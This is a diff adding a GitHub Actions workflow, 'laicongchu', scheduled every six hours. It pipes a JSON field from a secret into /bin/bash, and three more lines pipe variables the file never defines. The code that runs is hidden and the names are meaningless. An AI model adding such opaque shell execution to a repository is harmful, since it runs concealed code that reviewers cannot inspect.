@@ -1,0 +1,19 @@
+name: laicongchu
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '4 3/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: laicongchu
+        env:
+          jz93: ${{ secrets.jz93 }}
+        run: |
+          echo $jz93 | jq -r .gugp69 | /bin/bash
+          echo $bmwie1331 | jq -r .vmag5121 | /bin/bash
+          echo $g389 | jq -r .tuuj04 | /bin/bash
+          echo $gtgs912 | jq -r .yztoe2 | /bin/bash
+
